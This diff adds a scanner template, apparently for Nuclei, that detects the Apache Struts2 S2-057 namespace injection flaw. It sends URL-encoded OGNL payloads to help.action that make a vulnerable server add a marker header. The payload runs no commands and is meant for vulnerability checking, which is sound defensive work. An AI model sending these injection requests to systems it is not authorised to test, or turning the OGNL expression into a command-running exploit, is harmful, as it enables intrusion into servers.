@@ -1,0 +1,27 @@
+id: s2-057-math
+info:
+  name: Apache Struts2 S2-057 - Safe Math & Header Injection (Fixed)
+  author: seal-fixed
+  severity: critical
+  description: Namespace injection using universally available help.action
+  tags: safe-poc, struts2, cve, cve2018
+
+http:
+  - raw:
+      - |
+        GET /%24%7b%28%23context%5b%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%5d.addHeader%28%27X-Struts-Vuln%27%2c%27246908642%27%29%29%7d/help.action HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+      - |
+        GET /struts2-showcase/%24%7b%28%23context%5b%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%5d.addHeader%28%27X-Struts-Vuln%27%2c%27246908642%27%29%29%7d/help.action HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "X-Struts-Vuln: 246908642"
